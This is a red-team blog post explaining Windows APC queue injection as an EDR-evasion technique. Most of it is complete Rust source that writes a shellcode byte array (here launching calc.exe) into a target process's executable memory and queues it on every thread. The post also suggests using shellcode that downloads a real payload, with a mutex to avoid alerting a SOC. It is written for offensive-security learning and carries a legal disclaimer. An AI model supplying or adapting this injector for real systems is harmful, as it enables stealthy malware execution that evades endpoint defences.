# https://fluxsec.red/apc-queue-injection-rust

# EDR Evasion APC Queue Injection in Rust

You get a thread, you get a thread, and YOU get a thread!

* * *

## Introduction

The project can be found here on my [GitHub](https://github.com/0xflux/Rust-APC-Queue-Injection). This post is provided for red teamers and anybody interested in offensive cyber for legal purposes only. See my [legal disclaimer](https://fluxsec.red/#legal-disclaimer).

This is yet another post in my EDR Evasion series, looking at techniques which bypass Endpoint Detection and Response. This time we will be looking at APC - Asynchronous Procedure Calls. For reference, you can read the Windows docs [here](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls).

**Note**: When we talk about EDR evasion with techniques such as ETW bypasses, APC Queue Injection, and Process Injection - these can STILL be detected by more sophisticated EDR's.
By modern standards, these techniques are outdated, but are still worth learning as it teaches us techniques which **can** still work.

If you are interested in learning about how modern EDRs can detect this type of behaviour, I have a blog series where I am building an EDR from scratch, and you can check the
specifics about detecting these bypass techniques [here](https://fluxsec.red/event-tracing-for-windows-threat-intelligence-rust-consumer).

APC’s (Asynchronous Procedure Calls) allow a thread to execute a specific function asynchronously at some point in the future. A function can be queued to the APC queue for a specific thread for it to be executed, when that thread becomes ‘alertable’.

APC’s are a strange thing, in that I have never seen them used in a project I have worked on, or developed myself. However, to provide some examples of why developers may wish to use APC’s:

- Networking: In network applications, APCs allow for non-blocking socket operations. This means a thread can continue processing other tasks while waiting for data to be sent or received, improving the application’s responsiveness.
- File System: When performing file read/write operations, APCs can be used to queue completion routines, allowing the thread to handle other tasks while waiting for I/O operations to complete.
- Signaling: APCs facilitate communication between threads by allowing one thread to queue a function for execution by another thread. This is useful for signaling and coordinating complex multi-threaded operations.

Performing a [GitHub search](https://github.com/search?q=QueueUserAPC&type=code) for the Windows API function `QueueUserAPC` brings back 21.9k files which reference this API call, so, clearly, it is a well used feature of Windows programming. Somewhat hilariously, in the first few pages of results, the projects all relate to malware in some way (performing various injection techniques).

So, if we can callback to some function on a thread when it becomes alertable, what exactly does it mean for a thread to be alertable?

Pulling directly from the [Windows docs](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls):

When a user-mode APC is queued, the thread to which it is queued is not directed to call the APC function unless it is in an alertable state. A thread enters an alertable state when it calls the SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx function. If the wait is satisfied before the APC is queued, the thread is no longer in an alertable wait state so the APC function will not be executed. However, the APC is still queued, so the APC function will be executed when the thread calls another alertable wait function.

There is a downside to this technique, you need to inject into a process where a thread is likely to become alertable. Some good candidates would be **explorer.exe**, **notepad.exe** (on Windows 11 at least), and perhaps any web browser.

By leveraging existing threads in a target process, this technique reduces the risk of detection.

Here is an image I made to try help visualise this concept:

![APC Queue Injection EDR Evasion](https://fluxsec.red/static/images/apc_injection.png)

## EDR Evasion

So, why is this a technique that can bypass EDR?

During process injection, we make very suspicious calls, such as WriteProcessMemory and CreateRemoteThread, see my post here explaining [process injection](https://fluxsec.red/remote-process-dll-injection). These API’s are highly suspicious, and should be blocked by any EDR worth its salt. There are numerous ways to bypass EDR, as documented so far in my blog posts for [Hells Gate](https://fluxsec.red/rust-edr-evasion-hells-gate) and [ETW Evasion](https://fluxsec.red/etw-patching-rust).

Using APC Queue Injection allows us to bypass the requirement of CreateRemoteThread which almost certainly should trigger EDR. This technique alone may not require things such as Hell’s Gate to sneak past the EDR, making it a really valuable tool.

Think about it, instead of calling the dangerous `CreateRemoteThread` to spawn a **new** thread in the remote process, we can simply queue something to a thread which already exists.

So what do we queue? We queue a **function pointer** to where our shellcode is in the remote process.

Here’s what we do, I won’t be covering this in any real detail as I have covered this in other blog posts, but:

1. Open a handle to the remote process
2. Create new memory in that process equal to the size of our shellcode, setting the region to executable
3. Write the shellcode to the new memory
4. Enumerate all threads in the remote process, and for each thread, use `QueueUserAPC` passing in a pointer to our shellcode
5. Sit back, relax, and wait for it to execute.

## Shellcode

As for our shellcode, I have created a project on [GitHub](https://github.com/0xflux/rust_shellcode/tree/master) which allows you to create shellcode from a high level rust program. The caveats are that the high level program cannot use the standard library, and you should keep all allocations to the stack. Allocating to the heap may still work, but I wouldn’t have any confidence in that. Note, that project is heavily inspired by the work of [b1tg](https://github.com/b1tg/rust-windows-shellcode), I made some of my own modifications. Also, of note, is that the shellcode you produce should not end in a `loop {}`, this loop will cause the threads in the target process to block, which will block the process you are injecting into. Not very stealthy.

## The code

Let’s get straight to the code. I’ve explained most of the Windows functions we are using in my blog post on [DLL injection](https://fluxsec.red/remote-process-dll-injection). The only additional bit of code really is using shellcode and then enumerating threads and calling `QueueUserAPC`.

It’s also worth noting, the shellcode here will open calc.exe.

```rust
use std::{
    env, ffi::c_void, mem, process::exit, thread::sleep, time::Duration,
};
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError, PAPCFUNC},
    System::{
        Diagnostics::{
            Debug::WriteProcessMemory,
            ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD,
                THREADENTRY32,
            },
        },
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        Threading::{OpenProcess, OpenThread, QueueUserAPC, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS},
    },
};

fn main() {
    // to see how i generated this shellcode, check https://github.com/0xflux/rust_shellcode
    let payload: [u8; 434] = [\
        0xeb, 0x4e, 0x00, 0x00, 0xa3, 0x11, 0x00, 0x00, 0xa4, 0x11, 0x00, 0x00, 0x4b, 0x00, 0x45,\
        0x00, 0x52, 0x00, 0x4e, 0x00, 0x45, 0x00, 0x4c, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2e, 0x00,\
        0x44, 0x00, 0x4c, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63,\
        0x00, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,\
        0x00, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\
        0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0xc7, 0xc1, 0x00,\
        0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x0c, 0x25,\
        0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x51, 0x18, 0x48, 0x8b, 0x42, 0x10, 0x48, 0x8d, 0x15,\
        0x90, 0xff, 0xff, 0xff, 0x48, 0x89, 0xc1, 0x4c, 0x8b, 0x41, 0x60, 0x4d, 0x85, 0xc0, 0x74,\
        0x3d, 0x66, 0x83, 0x79, 0x58, 0x00, 0x74, 0x36, 0x49, 0xc7, 0xc1, 0xff, 0xff, 0xff, 0xff,\
        0x66, 0x43, 0x83, 0x7c, 0x48, 0x02, 0x00, 0x4d, 0x8d, 0x49, 0x01, 0x75, 0xf3, 0x49, 0x83,\
        0xf9, 0x0c, 0x75, 0x1c, 0x45, 0x31, 0xc9, 0x49, 0x83, 0xf9, 0x18, 0x74, 0x22, 0x45, 0x0f,\
        0xb7, 0x14, 0x11, 0x4d, 0x8d, 0x59, 0x02, 0x66, 0x47, 0x3b, 0x14, 0x08, 0x4d, 0x89, 0xd9,\
        0x74, 0xe7, 0x48, 0x8b, 0x09, 0x48, 0x39, 0xc1, 0x75, 0xb2, 0xb8, 0x78, 0x56, 0x34, 0x12,\
        0xeb, 0x04, 0x48, 0x8b, 0x41, 0x30, 0x41, 0xb8, 0x21, 0x43, 0x65, 0x87, 0x66, 0x81, 0x38,\
        0x4d, 0x5a, 0x0f, 0x85, 0x9d, 0x00, 0x00, 0x00, 0x8b, 0x48, 0x3c, 0x44, 0x8b, 0x84, 0x08,\
        0x88, 0x00, 0x00, 0x00, 0x42, 0x8b, 0x54, 0x00, 0x18, 0x42, 0x8b, 0x4c, 0x00, 0x1c, 0x46,\
        0x8b, 0x4c, 0x00, 0x20, 0x46, 0x8b, 0x44, 0x00, 0x24, 0x31, 0xdb, 0x4c, 0x8d, 0x15, 0x15,\
        0xff, 0xff, 0xff, 0x48, 0x39, 0xd3, 0x0f, 0x84, 0x81, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x73,\
        0x01, 0x41, 0x89, 0xdb, 0x43, 0x8d, 0x3c, 0x99, 0x8b, 0x3c, 0x38, 0x80, 0x3c, 0x38, 0x00,\
        0x48, 0x89, 0xf3, 0x74, 0xe0, 0x48, 0x01, 0xc7, 0x49, 0xc7, 0xc6, 0xff, 0xff, 0xff, 0xff,\
        0x42, 0x80, 0x7c, 0x37, 0x01, 0x00, 0x4d, 0x8d, 0x76, 0x01, 0x75, 0xf4, 0x48, 0x89, 0xf3,\
        0x49, 0x83, 0xfe, 0x07, 0x75, 0xc1, 0x31, 0xdb, 0x48, 0x83, 0xfb, 0x07, 0x74, 0x16, 0x42,\
        0x8a, 0x2c, 0x13, 0x4c, 0x8d, 0x73, 0x01, 0x40, 0x3a, 0x2c, 0x1f, 0x4c, 0x89, 0xf3, 0x74,\
        0xe9, 0x48, 0x89, 0xf3, 0xeb, 0xa3, 0x43, 0x8d, 0x14, 0x58, 0x0f, 0xb7, 0x14, 0x10, 0x81,\
        0xe2, 0xff, 0x3f, 0x00, 0x00, 0x8d, 0x0c, 0x91, 0x44, 0x8b, 0x04, 0x08, 0x49, 0x01, 0xc0,\
        0x48, 0x8d, 0x0d, 0xa1, 0xfe, 0xff, 0xff, 0xba, 0x01, 0x00, 0x00, 0x00, 0x5b, 0x5d, 0x5f,\
        0x5e, 0x41, 0x5e, 0x49, 0xff, 0xe0, 0x41, 0xb8, 0x44, 0x33, 0x22, 0x11, 0xeb, 0xe3, 0xcc,\
        0x01, 0x06, 0x05, 0x00, 0x06, 0x30, 0x05, 0x50, 0x04, 0x70, 0x03, 0x60, 0x02, 0xe0,\
    ];

    // get the pid from commandline
    let pid = collect_proc_addr();

    // ####################################################
    // GET HANDLE TO REMOTE PROCESS
    let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
    let h_process = match h_process {
        Ok(h) => {
            println!("[+] Got handle to process ID {pid}, handle: {:?}", h);
            h // return the handle
        }
        Err(e) => panic!("[-] Could not get handle to pid {pid}, error: {e}"),
    };

    let payload_len = payload.len();
    let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;

    unsafe {
        // ####################################################
        // ALLOCATE MEMORY IN REMOTE PROCESS

        let remotememory_ptr: *mut c_void = VirtualAllocEx(
            h_process,
            None,
            payload_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remotememory_ptr.is_null() {
            panic!("[-] Did not create memory. {:?}", GetLastError());
        }
        println!("[+] Allocated memory address: {:p}", remotememory_ptr);

        // ####################################################
        // WRITE PROCESS MEMORY

        let result_writeprocessmemory =
            WriteProcessMemory(h_process, remotememory_ptr, payload_ptr, payload_len, None);

        if let Err(e) = result_writeprocessmemory {
            panic!("[-] Error writing process memory {e}");
        }
        println!("[+] Successfully wrote process memory.");

        // ####################################################
        // INJECT VIA APC QUEUEING

        // fn pointer for the start routine
        let p_thread_start_routine: Option<unsafe extern "system" fn(usize)> =
            mem::transmute(remotememory_ptr);

        let mut threads: Vec<u32> = Vec::new(); // to store all threads in the target process

        // get the snapshot
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot.is_err() {
            panic!("[-] Failed to create snapshot");
        }

        // construct THREADENTRY32
        let mut thread_entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        // enumerate the threads in the process
        let mut success = Thread32First(snapshot.clone().unwrap(), &mut thread_entry);
        while success.is_ok() {
            if thread_entry.th32OwnerProcessID == pid {
                threads.push(thread_entry.th32ThreadID);
            }
            success = Thread32Next(snapshot.clone().unwrap(), &mut thread_entry);
        }

        let _ = CloseHandle(snapshot.unwrap());

        if threads.is_empty() {
            // if no threads, then panic, no point continuing execution
            panic!("[-] No threads found for PID: {}", pid);
        } else {
            println!("[+] Threads found: {:?}", threads);
        }

        // iterate through the threads, and queue the APC for that thread
        for thread in threads {
            // open the thread and get a handle
            let thread_handle = OpenThread(THREAD_ALL_ACCESS, true, thread);
            if thread_handle.is_err() {
                eprintln!("[-] Failed to open thread: {}", thread);
                continue;
            }

            let apc_routine: PAPCFUNC = Some(p_thread_start_routine.unwrap());

            let res = QueueUserAPC(apc_routine, thread_handle.clone().unwrap(), 0);
            if res == 0 {
                eprintln!("Failed to queue APC to thread: {}", thread);
            } else {
                println!("[+] APC queued for pid: {}, on thread: {}", pid, thread);
            }

            // close the thread handle
            let _ = CloseHandle(thread_handle.unwrap());

            sleep(Duration::from_millis(200));
        }
    }
}

/// Get the pid from the command line when the user starts the program
fn collect_proc_addr() -> u32 {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] PID required.");
        exit(1);
    }

    let pid = args[1].clone();
    let pid_as_int: u32 = pid.parse().unwrap();

    pid_as_int
}
```

## Taking it further

If you decide to make this yourself, you will notice 10 or so calculators pop up (from the shellcode)! This is somewhat a problem if we were doing a real red team operation; imagine the shellcode actually downloads our payload and runs it. We don’t want this happening 10+ times because:

1. It may be more likely to alert a SOC, and
2. It may cause c2 problems

So, a nice addition to the shellcode portion would be to create a unique mutex, and if it exists, exit. If it doesn’t exist, then continue.

Whilst this post has focussed on shellcode injection with APC Queueing, you can also use this technique with classic [DLL Injection](https://fluxsec.red/remote-process-dll-injection), but replacing `CreateRemoteThread` with APC injection.